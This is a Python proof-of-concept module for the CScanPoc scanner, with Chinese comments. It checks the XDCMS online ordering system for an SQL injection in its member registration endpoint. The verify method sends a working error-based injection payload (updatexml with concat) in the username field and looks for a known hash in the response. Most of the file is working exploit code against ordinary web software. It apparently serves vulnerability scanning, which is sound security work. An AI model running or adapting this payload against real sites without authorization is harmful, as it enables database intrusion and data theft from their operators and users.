# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'XDCMS_0001' # 平台漏洞编号，留空
    name = 'XDCMS网上订餐系统 sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-05'  # 漏洞公布时间
    desc = '''
        旭东企业网站管理系统订餐网站管理系统，主要使用PHP开发的在线订餐门户网站系统，集成在线订餐、团购、积分商城、优惠券、新闻资讯、在线订单、在线支付、生成订单短信/邮箱通知、点评、Baidu地图、无线打印机、手机订餐功能于一体餐饮行业门户。
        XDCMS网上订餐系统 /index.php?m=member&f=register_save SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=94532
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'XDCMS(旭东企业网站管理系统)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec0a8e59-bc79-416e-a3f3-673b7f2c6ff2'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            target = arg + "/index.php?m=member&f=register_save" 
            data = {
                "username": "sss' And 1 like(updAtexml(1,concat(0x5e24,(Select concat(md5(123),0x3a,0x3a)),0x5e24),1))#",
                "password": "123456",
                "password2": "123456",
                "fields[truename]": "",
                "fileds[email]": "",
                "submit": " ? ? "
            }
            payload = urllib.urlencode(data)
            code, head,res, errcode, _ = hh.http('-d %s %s' % (payload, target))
                       
            if code == 200 and "ac59075b964b0715" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()